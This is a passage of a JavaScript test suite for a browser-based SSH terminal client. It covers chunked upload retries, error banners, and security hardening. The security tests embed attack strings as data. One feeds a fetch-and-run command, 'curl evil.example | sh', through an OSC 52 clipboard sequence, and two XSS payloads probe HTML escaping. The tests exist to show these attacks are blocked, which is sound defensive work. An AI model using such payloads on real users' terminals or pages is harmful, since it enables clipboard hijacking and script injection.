     st.calls.filter(c => c.offset > 0).map(c => c.len).join(','));
  cleanup(env);
});

// Guard: forward progress resets the failure/try budget but KEEPS the
// shrunk size. The proxy truncates (400 "fewer bytes") the FIRST attempt
// at each offset, then lets the retry through - so every piece fails once
// and the total failures across the file exceed what a single piece's try
// budget would allow; the upload must still complete because each landed
// piece resets the budget. (On the old code the first 400 is final → no
// completion: this is red before the fix.)
test('upload in pieces: forward progress resets the try budget and keeps the shrunk size', async () => {
  const {env, win, p} = await pieceEnv();
  const seen = {};
  const st = pieceServer(win, (offset, len) => {
    seen[offset] = (seen[offset] || 0) + 1;
    return seen[offset] === 1
      ? {status: 400, body: {error: 'client sent fewer bytes than Content-Length'}}
      : {status: 200, body: {ok: true, size: offset + len}};
  });
  win.handleUpload(p.id, {files: [bigFile('big.bin', 3 * 1024 * 1024)], value: ''});
  await uploadSettles(p, env.log);
  ok(assembled(st) === 3 * 1024 * 1024, 'file complete, every byte once/in order; pieces=' + JSON.stringify(st.file));
  ok(/Saved to/.test(bannerOf(p)), 'completed; banner=' + JSON.stringify(bannerOf(p)));
  const sizes = st.calls.map(c => c.len);
  ok(sizes[sizes.length - 1] <= sizes[0], 'the last piece is no bigger than the first (size kept, not re-grown); ' + sizes.join(','));
  cleanup(env);
});

// Guard: a genuinely FINAL 400 (invalid path) stops at once, with its own
// message - NOT the proxy/truncation banner. Protects the fix from
// treating every 400 as a cut.
test('upload in pieces: a final 400 (invalid path) stops at once with its own message', async () => {
  const {env, win, p} = await pieceEnv();
  const st = pieceServer(win, () => ({status: 400, body: {error: 'invalid path'}}));
  win.handleUpload(p.id, {files: [bigFile('big.bin', 10 * 1024 * 1024)], value: ''});
  await uploadSettles(p, env.log);
  ok(st.calls.length === 1, 'one request, no retries; got ' + st.calls.length);
  ok(/rejected by the server/.test(bannerOf(p)), 'its own message; got ' + JSON.stringify(bannerOf(p)));
  ok(!/blocked|cut short|proxy|firewall/i.test(bannerOf(p)), 'NOT the proxy text; got ' + JSON.stringify(bannerOf(p)));
  cleanup(env);
});

// Guard: cancelling while the upload is retrying/shrinking stops it
// cleanly - banner "Cancelled", and no further request is sent (the new
// stall-watchdog must not spawn a zombie piece after cancel).
test('upload in pieces: cancel during a shrink stops cleanly, no zombie request', async () => {
  const {env, win, p} = await pieceEnv();
  win.UPLOAD_WALLCLOCK_MS = 4000;            // long enough not to give up before we cancel
  const st = pieceServer(win, (offset, len) =>
    len > 256 * 1024 ? 'neterr' : {status: 200, body: {ok: true, size: offset + len}});
  win.handleUpload(p.id, {files: [bigFile('big.bin', 10 * 1024 * 1024)], value: ''});
  for (let i = 0; i < 400 && st.calls.length < 3; i++) await sleep(5);
  const before = st.calls.length;
  win.cancelUpload(p.id);
  for (let i = 0; i < 40; i++) await sleep(5);
  ok(st.calls.length === before, 'no request after cancel; before=' + before + ' after=' + st.calls.length);
  ok(/Cancelled/.test(bannerOf(p)), 'banner shows Cancelled; got ' + JSON.stringify(bannerOf(p)));
  cleanup(env);
});

// A custom XHR that emits a couple of upload progress ticks and then
// goes SILENT, never sending a reply (a proxy that holds the connection
// open but takes nothing - the owner's 120 s stall). It honours
// xhr.timeout so the OLD code's only escape is the full per-piece
// timeout. `onEachSend` lets a test count pieces.
function stallXhr(win, onEachSend) {
  win.XMLHttpRequest = class {
    constructor() { this.upload = {}; this.status = 0; this.responseText = ''; this.timeout = 0; }
    open(m, u) { this.url = u; }
    setRequestHeader() {}
    abort() { this.aborted = true; clearTimeout(this._p1); clearTimeout(this._p2); clearTimeout(this._tt); }
    send() {
      if (onEachSend) onEachSend();
      this._p1 = setTimeout(() => { if (!this.aborted && this.upload.onprogress) this.upload.onprogress({loaded: 1000}); }, 8);
      this._p2 = setTimeout(() => { if (!this.aborted && this.upload.onprogress) this.upload.onprogress({loaded: 2000}); }, 24);
      if (this.timeout) this._tt = setTimeout(() => { if (!this.aborted && this.ontimeout) this.ontimeout(); }, this.timeout);
    }
  };
}

// A: a stalled piece surfaces a VISIBLE, proxy-named failure FAST (within
// the wall-clock budget), not after the 120 s per-piece timeout. On the
// old code (no stall watchdog) nothing shows within the bound → red.
test('upload in pieces: a stalled body fails fast on the wall-clock budget, not the 120 s timeout', async () => {
  const {env, win, p} = await pieceEnv();
  win.UPLOAD_WALLCLOCK_MS = 120;             // body stalled this long with no progress -> give up
  win.UPLOAD_CHUNK_TIMEOUT_MS = 4000;        // the per-piece timeout, far past the wall-clock bound
  let sends = 0;
  stallXhr(win, () => { sends++; });
  win.handleUpload(p.id, {files: [bigFile('big.bin', 10 * 1024 * 1024)], value: ''});
  // A correct fix aborts a stalled body ~UPLOAD_WALLCLOCK_MS after progress
  // stops (~150 ms here); it must not wait the full 4 s per-piece timeout.
  let shown = false;
  for (let i = 0; i < 150 && !shown; i++) { await sleep(10); shown = /Upload (failed|blocked)|cut short/i.test(bannerOf(p)); }
  ok(shown, 'a failure banner appeared within ~1.5 s (<< the 4 s timeout); banner=' + JSON.stringify(bannerOf(p)));
  ok(/blocked|cut short|proxy|firewall/i.test(bannerOf(p)), 'and it names the probable cause; got ' + JSON.stringify(bannerOf(p)));
  win.cancelUpload(p.id);                    // stop any in-flight loop (old code) before teardown
  cleanup(env);
});

// A custom XHR that KEEPS emitting progress (a slow but live transfer),
// then completes 200 - must NOT be killed by the wall-clock watchdog
// (progress re-arms it). Guards the cap against killing a healthy slow
// upload.
test('upload in pieces: a slow but progressing upload is not killed by the wall-clock cap', async () => {
  const {env, win, p} = await pieceEnv();
  win.UPLOAD_WALLCLOCK_MS = 120;             // shorter than the whole transfer below
  const size = 1024 * 1024;                  // one piece
  win.XMLHttpRequest = class {
    constructor() { this.upload = {}; this.status = 0; this.responseText = ''; this.timeout = 0; }
    open(m, u) { this.url = u; } setRequestHeader() {}
    abort() { this.aborted = true; clearTimeout(this._t); }
    send() {
      let ticks = 0;
      const tick = () => {
        if (this.aborted) return;
        ticks++;
        if (this.upload.onprogress) this.upload.onprogress({loaded: ticks * 150000});
        if (ticks < 6) { this._t = setTimeout(tick, 40); }      // progress every 40 ms < 120 ms budget
        else {
          if (this.upload.onload) this.upload.onload();          // body fully sent
          this.status = 200; this.responseText = JSON.stringify({ok: true, size: size});
          if (this.onload) this.onload();
        }
      };
      this._t = setTimeout(tick, 40);
    }
  };
  win.handleUpload(p.id, {files: [bigFile('big.bin', size)], value: ''});
  let done = false;
  for (let i = 0; i < 120 && !done; i++) { await sleep(10); done = /Saved to|Upload complete/.test(bannerOf(p)); }
  ok(done, 'the slow upload completed, was not aborted; banner=' + JSON.stringify(bannerOf(p)));
  cleanup(env);
});

// A. When the proxy truncates and the piece can never get through (even
// the smallest piece is over the proxy's limit), the user must get a
// VISIBLE, SPECIFIC error that names the probable cause (a proxy /
// firewall / size limit) and is actionable - not a generic network /
// iCloud message. Proxy model: any body over 200 KB is dropped, which is
// below the 256 KB shrink floor, so no piece ever passes.
test('upload in pieces: an unpassable truncation fails with a proxy/size cause named', async () => {
  const {env, win, p} = await pieceEnv();
  const TH = 200 * 1024;                       // below UPLOAD_CHUNK_MIN (256 KB)
  const st = pieceServer(win, (offset, len) =>
    len > TH ? 'neterr' : {status: 200, body: {ok: true, size: offset + len}});
  win.handleUpload(p.id, {files: [bigFile('big.bin', 10 * 1024 * 1024)], value: ''});
  await uploadSettles(p, env.log);
  const banner = bannerOf(p);
  // A terminal failure banner (not progress, not success). The agreed
  // wording for a truncation give-up is "Upload blocked or cut short — …".
  ok(/Upload (failed|blocked)|cut short/i.test(banner) && !/\d+%\s*$/.test(banner),
     'a terminal failure banner is shown; got ' + JSON.stringify(banner));
  ok(/proxy|firewall|size limit|too large|network.*(between|limit)|blocking|blocked/i.test(banner),
     'the reason names a probable proxy/size cause; got ' + JSON.stringify(banner));
  // The stale iCloud/connection hint is a per-retry debug reason only; it
  // must not be the final banner the user is left with.
  ok(!/iCloud|Drive/i.test(banner), 'no stale iCloud text in the final banner; got ' + JSON.stringify(banner));
  cleanup(env);
});

// A. The same unpassable truncation must be given up FAST, not after the
// full try budget of long timeouts (8 × 120 s ≈ 16 min of a 0% bar). With
// no forward progress and the floor reached, the client must stop early -
// it must not keep hammering the floor-sized piece to exhaust the budget.
test('upload in pieces: no forward progress is stopped fast, not after the whole try budget', async () => {
  const {env, win, p} = await pieceEnv();
  const TH = 200 * 1024;
  const FLOOR = 256 * 1024;        // UPLOAD_CHUNK_MIN in websh.js (const, not exposed)
  const TRIES = 8;                 // UPLOAD_CHUNK_TRIES in websh.js (const, not exposed)
  const st = pieceServer(win, (offset, len) =>
    len > TH ? 'neterr' : {status: 200, body: {ok: true, size: offset + len}});
  win.handleUpload(p.id, {files: [bigFile('big.bin', 10 * 1024 * 1024)], value: ''});
  await uploadSettles(p, env.log);
  ok(/Upload (failed|blocked)|cut short/i.test(bannerOf(p)), 'it did fail; banner=' + JSON.stringify(bannerOf(p)));
  ok(st.calls.length < TRIES,
     'gave up before the full try budget (' + TRIES + '); requests: ' + st.calls.length);
  const floorTries = st.calls.filter(c => c.len === FLOOR).length;
  ok(floorTries <= 2,
     'did not keep hammering the floor-sized piece; floor-sized requests: ' + floorTries);
  cleanup(env);
});

test('upload: an older server (no upload_chunks) still gets the whole file in one request', async () => {
  const env = await mkEnv([
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'upload_finalize', response: {ok: true, path: '/home/u/big.bin'}},
  ]);
  const win = env.win;
  const st = pieceServer(win, (offset, len) => ({status: 200, body: {ok: true}}));
  const p = win.createPane(win.document.getElementById('panes'));
  p.sid = 's1'; p.host = 'h'; p.persistent = true; p.cwd = '/home/u';
  win.handleUpload(p.id, {files: [bigFile('big.bin', 10 * 1024 * 1024)], value: ''});
  await uploadSettles(p, env.log);
  ok(st.calls.length === 1 && st.calls[0].offset === null, 'one request, no offset; got ' + JSON.stringify(st.calls));
  cleanup(env);
});

test('upload finalize failure reports bytes-landed without jargon', async () => {
  const env = await mkEnv([
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'upload_finalize', response: {error: 'control socket not ready'}},
  ]);
  const win = env.win;
  win.XMLHttpRequest = class {
    constructor() { this.upload = {}; this.status = 200;
      this.responseText = JSON.stringify({ok: true, bytes: 10}); }
    open() {} setRequestHeader() {} abort() {}
    send() { if (this.onload) this.onload(); }
  };
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  p.sid = 's1'; p.host = 'h'; p.persistent = true;
  win.handleUpload(p.id, {files: [{name: 'doc.pdf', size: 10}], value: ''});
  await sleep(20);
  const text = p.el.querySelector('[data-upload-progress] .upload-progress-text');
  // The bytes are in $HOME/<tmp>; the banner now names that file AND the
  // server's reason ("control socket not ready" here) instead of a fixed
  // sentence about "the current directory".
  ok(/^Upload failed: saved to your home folder as \.websh-tmp-[a-z0-9-]+, but the connection to the host is not ready yet$/.test(text.textContent),
     'finalize-fail message; got ' + JSON.stringify(text.textContent));
  ok(text.textContent.indexOf('$HOME') === -1, 'no $HOME jargon');
  ok(text.textContent.indexOf('control socket') === -1, 'no raw server string');
  cleanup(env);
});

// The dwell time is the whole reason the diff exists — a failure banner
// must linger long enough (6000ms) to read the reason, while a trivial
// success still clears fast (2000ms).
test('failure banner lingers 6s, trivial success clears in 2s', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const delays = [];
  const realSetTimeout = win.setTimeout;
  win.setTimeout = function (fn, ms) { delays.push(ms); return realSetTimeout.call(win, function () {}, 100000); };
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  p.upload = {staged: [], placed: []};
  win.finishUpload(p, false, 'something went wrong');
  ok(delays.indexOf(6000) !== -1, 'failure dwell is 6000ms; got ' + JSON.stringify(delays));
  delays.length = 0;
  p.upload = {staged: [], placed: []};
  win.finishUpload(p, true);
  ok(delays.indexOf(2000) !== -1, 'trivial-success dwell is 2000ms; got ' + JSON.stringify(delays));
  win.setTimeout = realSetTimeout;
  cleanup(env);
});

test('upload server 413 surfaces the too-large reason', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  win.XMLHttpRequest = class {
    constructor() { this.upload = {}; this.status = 413;
      this.responseText = JSON.stringify({error: 'file too large'}); }
    open() {} setRequestHeader() {} abort() {}
    send() { if (this.onload) this.onload(); }
  };
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  p.sid = 's1'; p.host = 'h';
  win.handleUpload(p.id, {files: [{name: 'big.bin', size: 9e9}], value: ''});
  await sleep(5);
  const text = p.el.querySelector('[data-upload-progress] .upload-progress-text');
  ok(text.textContent === 'Upload failed: file is larger than the server allows',
     '413 reason; got ' + JSON.stringify(text.textContent));
  cleanup(env);
});

// Every third-party (jsdelivr CDN) <script>/<link> on the credential page
// must carry Subresource Integrity + crossorigin, so a CDN/MITM swap can't
// inject code into the page that handles SSH passwords and the vault.
test('all cdn.jsdelivr.net assets carry SRI integrity + crossorigin', async () => {
  const tags = html.match(/<(?:script|link)\b[^>]*cdn\.jsdelivr\.net[^>]*>/g) || [];
  ok(tags.length >= 6, 'expected the 6 xterm CDN tags; got ' + tags.length);
  tags.forEach(t => {
    ok(/\sintegrity="sha384-[A-Za-z0-9+/=]+"/.test(t),
       'missing SRI integrity on: ' + t);
    ok(/\scrossorigin=/.test(t), 'missing crossorigin on: ' + t);
  });
});

// =====================================================================
// Regression for the base64-decode perf refactor (tight loop replacing
// Uint8Array.from(...,cb)): output bytes must still round-trip EXACTLY,
// including NUL, ESC and high (>=0x80) bytes.
test('handleOutputPayload decodes base64 output to exact bytes', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  let captured = null;
  p.term.write = (u) => { captured = u; };
  const raw = [0x00, 0x1b, 0x5b, 0xff, 0x41, 0x80, 0x7f];
  const b64 = win.btoa(String.fromCharCode.apply(null, raw));
  win.handleOutputPayload(p, {data: b64});
  ok(captured && captured.length === raw.length,
     'wrote ' + raw.length + ' bytes; got ' + (captured && captured.length));
  ok(captured && raw.every((b, i) => captured[i] === b),
     'bytes match exactly; got ' + (captured && Array.from(captured)));
  cleanup(env);
});

// =====================================================================
// c.port was the one un-esc()'d value interpolated into the saved-card
// innerHTML. Coercing it to a Number closes a would-be stored-XSS hole if
// a non-numeric port ever reaches a saved record (import/restore, bug).
test('renderSaved coerces a non-numeric port to a number (no injection)', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  win.localStorage.setItem('websh_connections', JSON.stringify([
    {name: 'x', host: 'h', user: 'u',
     port: '22"><img src=x onerror=window.__xss=1>', auth: 'pw', persistent: false},
  ]));
  win.renderSaved();
  const host = win.document.querySelector('.sv-host');
  ok(host, 'rendered a saved card');
  ok(host && host.innerHTML.indexOf('<img') === -1,
     'no injected markup in host line; got ' + (host && host.innerHTML));
  ok(host && host.textContent.indexOf(':22') !== -1,
     'port shown as the fallback number; got ' + (host && host.textContent));
  cleanup(env);
});

// =====================================================================
// OSC 52 clipboard handler: decode multibyte UTF-8 via TextDecoder (not the
// deprecated escape()), and refuse a pathologically large payload from a
// (possibly hostile) remote host.
test('the X on a failed upload banner dismisses it and keeps the staged file', async () => {
  // After a failed move the banner says the bytes are safe in $HOME; the
  // X stayed visible for 6 s and clicking it POSTed upload_cancel for
  // that exact tmp file - the only copy - which the server deleted.
  const plan = FB_PLAN(FB_ENTRIES, '/home/alice').concat([
    {action: 'upload_finalize', response: {error: 'Permission denied'}},
    {action: 'upload_cancel', response: {ok: true}},
  ]);
  const env = await mkEnv(plan); const win = env.win;
  okXhr(win);
  const p = await _onePane(win);
  win.showFileBrowser(p.id);
  await sleep(40);
  win.fbStartUpload([fakeFile('a.txt', 3)]);
  await sleep(60);
  const text = () => p.el.querySelector('[data-upload-progress] .upload-progress-text').textContent;
  ok(/saved to your home folder/.test(text()), 'failure banner shown; got ' + text());
  win.cancelTransfer(p.id);                       // the user clicks X
  await sleep(20);
  ok(!env.log.some(r => r.action === 'upload_cancel'), 'staged file NOT deleted');
  ok(!p.upload, 'banner dismissed, slot free');
  ok(!/Cancelled/.test(text()), 'not relabelled "Cancelled"');
  // A new upload right away is not clobbered by the old banner's timer.
  win.fbStartUpload([fakeFile('b.txt', 3)]);
  ok(p.upload && p.upload.files[0].name === 'b.txt', 'new upload started');
  cleanup(env);
});

test('OSC 52 from plain output cannot replace the clipboard', async () => {
  // The handler was always on: `tail -f` of a log carrying an injected
  // ESC]52 sequence silently put an attacker's command line on the
  // clipboard, and turning Auto-copy off did not stop it.
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const p = win.createPane(win.document.getElementById('panes'));
  const copies = [];
  win.copyText = (t) => copies.push(t);
  const evil = win.btoa('curl evil.example | sh');
  ok(p.term.parser._fireOsc(52, 'c;' + evil) === true, 'sequence consumed');
  ok(copies.length === 0, 'no gesture -> clipboard untouched; got ' + JSON.stringify(copies));
  // A real copy (right after the user selects) still works...
  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));
  p.term.parser._fireOsc(52, 'c;' + win.btoa('ok'));
  ok(copies.length === 1 && copies[0] === 'ok', 'copy after a selection works');
  // ...unless Auto-copy is off.
  win.settings.tmuxClipboard = false;
  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));
  p.term.parser._fireOsc(52, 'c;' + win.btoa('no'));
  ok(copies.length === 1, 'Auto-copy off -> no remote clipboard writes');
  win.settings.tmuxClipboard = true;
  cleanup(env);
});

test('OSC 52 decodes UTF-8 clipboard text correctly', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  let captured = null;
  win.copyText = (t) => { captured = t; };
  const utf8 = '→ café ✓';
  const b64 = win.btoa(unescape(encodeURIComponent(utf8)));
  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));  // the user's selection
  const handled = p.term.parser._fireOsc(52, '0;' + b64);
  ok(handled === true, 'OSC 52 handled; got ' + handled);
  ok(captured === utf8, 'decoded UTF-8 exactly; got ' + JSON.stringify(captured));
  cleanup(env);
});

test('OSC 52 refuses an oversize clipboard payload', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  let called = false;
  win.copyText = () => { called = true; };
  const huge = '0;' + 'A'.repeat(2 * 1024 * 1024);  // 2 MB base64 > cap
  const handled = p.term.parser._fireOsc(52, huge);
  ok(handled === false, 'oversize OSC 52 rejected; got ' + handled);
  ok(called === false, 'clipboard not written for oversize payload');
  cleanup(env);
});

// =====================================================================
// Discriminates the TextDecoder refactor from the old escape() path, which
// the round-trip test above does not: a leading BOM must be preserved
// (needs ignoreBOM), and bytes that are not valid UTF-8 must fall back to
// the raw latin1 via the catch (not U+FFFD). Without ignoreBOM the BOM
// assertion fails; without the catch the invalid-byte assertion fails.
test('OSC 52 preserves a leading BOM and keeps raw bytes on invalid UTF-8', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  let captured = null;
  win.copyText = (t) => { captured = t; };
  // Leading BOM + text: old escape() kept U+FEFF; bare TextDecoder strips a
  // leading BOM, so this asserts ignoreBOM keeps it.
  const bom = String.fromCharCode(0xFEFF) + 'hi';
  let b64 = win.btoa(unescape(encodeURIComponent(bom)));
  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));  // the user's selection
  ok(p.term.parser._fireOsc(52, '0;' + b64) === true, 'BOM payload handled');
  ok(captured === bom, 'leading BOM preserved; got ' + JSON.stringify(captured));
  // Lone 0x80 is not valid UTF-8: fatal:true throws and the catch keeps the
  // raw latin1 byte rather than substituting U+FFFD.
  captured = null;
  b64 = win.btoa(String.fromCharCode(0x80));
  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));  // the user's selection
  ok(p.term.parser._fireOsc(52, '0;' + b64) === true, 'invalid-byte payload handled');
  ok(captured === '\x80', 'raw latin1 kept on invalid UTF-8; got ' + JSON.stringify(captured));
  cleanup(env);
});

// =====================================================================
// connectPane must not act on a pane destroyed while /api/connect is in
// flight: it would re-arm timers on a dead pane and leak the server PTY
// that connect just created. The guard reaps the orphan session instead.
test('connectPane reaps the orphan session when the pane is destroyed mid-connect', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'orphan-sid', alive: true}, delay: 60},
    {action: 'disconnect', response: {ok: true}},
    {action: 'resize', response: {ok: true}},
    {action: 'output', response: {data: '', alive: true}},
  ];
  const env = await mkEnv(plan); const win = env.win; const log = env.log;
  const root = win.document.getElementById('panes');
  const p = win.createPane(root);
  win.connectPane(p, {label: 'x', host: '10.0.0.9', user: 'a', password: 'p', persistent: false});
  await sleep(20);                 // connect still in flight (delay 60)
  win._destroyPane(p.id, false);   // p.sid still null here, so destroy sends no disconnect
  await sleep(140);                // let the connect promise resolve
  const discs = log.filter(e => e.action === 'disconnect' &&
    e.body && e.body.session_id === 'orphan-sid');
  ok(discs.length >= 1, 'orphan session disconnected; got ' + discs.length);
  ok(p.sid !== 'orphan-sid', 'dead pane not activated; sid=' + p.sid);
  ok(p.polling !== true, 'no polling armed on dead pane; polling=' + p.polling);
  cleanup(env);
});

// In-flight guard: a second connectPane for the same pane while the first
// /api/connect is still outstanding must be ignored. Otherwise it launches
// a second session, overwrites p.sid, and leaks the first server PTY.
test('connectPane ignores a concurrent connect for the same pane', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {session_id: 'sid-1', alive: true}, delay: 60},
    {action: 'output', response: {data: '', alive: true}},
    {action: 'resize', response: {ok: true}},
  ];
  const env = await mkEnv(plan); const win = env.win; const log = env.log;
  const p = win.createPane(win.document.getElementById('panes'));
  win.connectPane(p, {label: 'x', host: '10.0.0.1', user: 'a', password: 'p'});
  // Duplicate entrant while the first connect is still in flight.
  win.connectPane(p, {label: 'x', host: '10.0.0.1', user: 'a', password: 'p'});
  await sleep(140);
  const connects = log.filter(e => e.action === 'connect');
  ok(connects.length === 1, 'exactly one connect issued; got ' + connects.length);
  ok(p.sid === 'sid-1', 'pane ended on the single session; sid=' + p.sid);
  cleanup(env);
});

// Stale-frame guard: a late "session not found" for a session the pane has
// already moved off of must NOT tear down the current session.
test('handleOutputPayload ignores a stale frame for a replaced session', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const p = win.createPane(win.document.getElementById('panes'));
  p.sid = 'sid-2'; p.polling = true; p.host = '10.0.0.1'; p.user = 'a';
  const stopped = win.handleOutputPayload(p, {error: 'session not found'}, 'sid-1');
  ok(stopped === true, 'stale frame tells its own loop to stop');
  ok(p.sid === 'sid-2', 'current session preserved; sid=' + p.sid);
  ok(p.polling === true, 'current polling not torn down');
  cleanup(env);
});

// Positive control: an error frame whose sid matches the current session
// still tears it down (so the guard does not over-block real errors).
test('handleOutputPayload acts on an error frame for the current session', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const p = win.createPane(win.document.getElementById('panes'));
  // No host/connection → error branch takes the doAutoConnect path, not a
  // reconnect, so we don't need a connect in the plan.
  p.sid = 'sid-cur'; p.polling = true; p.host = ''; p.connection = null;
  const stopped = win.handleOutputPayload(p, {error: 'session not found'}, 'sid-cur');
  ok(stopped === true, 'current error frame stops the loop');
  ok(p.sid === null, 'current session torn down; sid=' + p.sid);
  ok(p.polling === false, 'polling stopped');
  cleanup(env);
});

// =====================================================================
// Connect errors on a reconnect/restore (overlay closed) must surface on
// the pane, not the hidden #err line inside the closed overlay.
test('connect error with the overlay closed shows the reconnect bar', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'connect', response: {error: 'no route to host'}},
  ];
  const env = await mkEnv(plan); const win = env.win;
  win.document.getElementById('ov').classList.add('h');  // reconnect context
  const p = win.createPane(win.document.getElementById('panes'));
  await win.connectPane(p, {label: 'x', host: '10.0.0.1', user: 'a', password: 'p'});
  await sleep(40);
  const bar = p.el.querySelector('[data-reconnect]');
  ok(bar && !bar.classList.contains('h'),
     'reconnect bar shown so the user can retry after a connect error');
  cleanup(env);
});

test('showErr falls back to a toast when the overlay is closed', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  win.document.getElementById('ov').classList.add('h');
  win.showErr('boom');
  const toasts = win.document.querySelectorAll('#toastHost .toast');
  ok(toasts.length === 1 && /boom/.test(toasts[0].textContent),
     'error surfaced as a toast; got ' + toasts.length);
  ok(!win.document.getElementById('err').classList.contains('on'),
     'hidden inline #err not used when overlay is closed');
  cleanup(env);
});

test('showErr uses the inline error line when the overlay is open', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  win.document.getElementById('ov').classList.remove('h');  // form is open
  win.showErr('formfail');
  const err = win.document.getElementById('err');
  ok(err.classList.contains('on') && /formfail/.test(err.textContent),
     'inline error line used while the connect form is open');
  cleanup(env);
});

// =====================================================================
// Right-click paste must route through term.paste() (bracketed-paste
// aware) rather than raw queueInput(), so multi-line clipboard content
// isn't executed line-by-line in the shell (paste-jacking hazard, made
// worse by the OSC 52 remote-clipboard-write handler).
test('right-click paste routes through term.paste, not raw queueInput', async () => {
  const plan = [
    {action: 'config', response: {restrict_hosts: false, connections: []}},
    {action: 'input', response: {ok: true}},
  ];
  const env = await mkEnv(plan); const win = env.win; const log = env.log;
  const p = win.createPane(win.document.getElementById('panes'));
  p.sid = 'sid-paste';
  // Stub the async clipboard read with multi-line content.
  Object.defineProperty(win.navigator, 'clipboard', {
    value: { readText: () => Promise.resolve('line1\nline2\n') },
    configurable: true,
  });
  const termEl = p.el.querySelector('.pane-term');
  termEl.dispatchEvent(new win.MouseEvent('contextmenu',
    {bubbles: true, cancelable: true}));
  await sleep(40);
  ok(p.term._pasteCalls && p.term._pasteCalls.length === 1,
     'term.paste called once; got ' + (p.term._pasteCalls || []).length);
  ok(p.term._pasteCalls[0] === 'line1\nline2\n',
     'paste received the clipboard text');
  const sent = log.filter(e => e.action === 'input' && e.body &&
                               e.body.session_id === 'sid-paste');
  ok(sent.length >= 1 &&
     sent.map(e => e.body.data).join('').indexOf('line1') !== -1,
     'pasted content reached /api/input via onData');
  cleanup(env);
});

// =====================================================================
// isolate_storage: settings are loaded at module init under the empty
// prefix, but written (saveSettings) under the path-scoped prefix. After
// /api/config reveals isolate_storage, loadServerConfig must reload them
// from the path-scoped key so per-path settings round-trip instead of
// reading the shared key forever.
test('isolate_storage reloads settings from the path-scoped key', async () => {
  // mkEnv URL is http://localhost/websh/ so the path-scope prefix is "/websh/".
  const env = await mkEnv([
    {action: 'config', response: {isolate_storage: true, restrict_hosts: false, connections: []}},
  ]);
  const win = env.win;
  // Different fontSizes under the shared (unprefixed) and path-scoped keys.
  win.localStorage.setItem('websh_settings', JSON.stringify({fontSize: 11}));
  win.localStorage.setItem('/websh/websh_settings', JSON.stringify({fontSize: 19}));
  win.eval('loadServerConfig()');   // fresh page-load with the prefix known
  await sleep(40);
  ok(win.settings.fontSize === 19,
     'settings read from the path-scoped key; got ' + win.settings.fontSize);
  ok(win.fontSizeVal === 19,
     'fontSize alias re-derived from path-scoped settings; got ' + win.fontSizeVal);
  cleanup(env);
});

// =====================================================================
// The client-side upload-mv collision loop must build name(1), name(2)
// from the original name, not strip a "(...)" suffix (which mangled real
// names with parentheses). Mirrors the server-side finalize fix.
test('makeUploadMvCmd builds the collision counter from the original name', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win;
  const cmd = win.makeUploadMvCmd('report(final)', '.websh-tmp-x');
  ok(cmd.indexOf('o="$f"') !== -1, 'uses original-name loop; got ' + cmd);
  ok(cmd.indexOf('${f%(*)}') === -1, 'no fragile suffix-strip; got ' + cmd);
  cleanup(env);
});

// =====================================================================
// renderServerConnections interpolates the operator-config username; it must
// esc() it like c.name/c.host (renderSaved already escapes every field). An
// operator-supplied username with markup would otherwise inject into the
// credential page. Sibling hardening to the #90 saved-port fix.
test('renderServerConnections escapes a malicious connection username', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: true, connections:
    [{name: 'evil', kind: 'prompt', host: 'h', port: 22,
      username: '<img src=x onerror=window.__xss=1>'}]}}]);
  const win = env.win;
  win.renderServerConnections();
  const host = win.document.querySelector('#serverList .sv-host');
  ok(host, 'rendered a server connection');
  ok(host.innerHTML.indexOf('<img') === -1,
     'username escaped, no injected markup; got ' + host.innerHTML);
  cleanup(env);
});

// =====================================================================
// The server caps the /api/input body at MAX_BODY_SIZE (8 MB). queueInput
// must refuse a paste that would exceed it and surface an error, instead of
// firing a POST that 400s and silently vanishes.
test('queueInput refuses an oversize paste and surfaces an error', async () => {
  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
  const win = env.win; const log = env.log;
  const p = win.createPane(win.document.getElementById('panes'));
  p.sid = 'sid-big';
  let errs = 0; win.showErr = () => { errs++; };
  win.queueInput(p, 'x'.repeat(9 * 1024 * 1024));  // 9 MB > 8 MB body cap
  await sleep(40);
  const sent = log.filter(e => e.action === 'input' && e.body && e.body.session_id === 'sid-big');
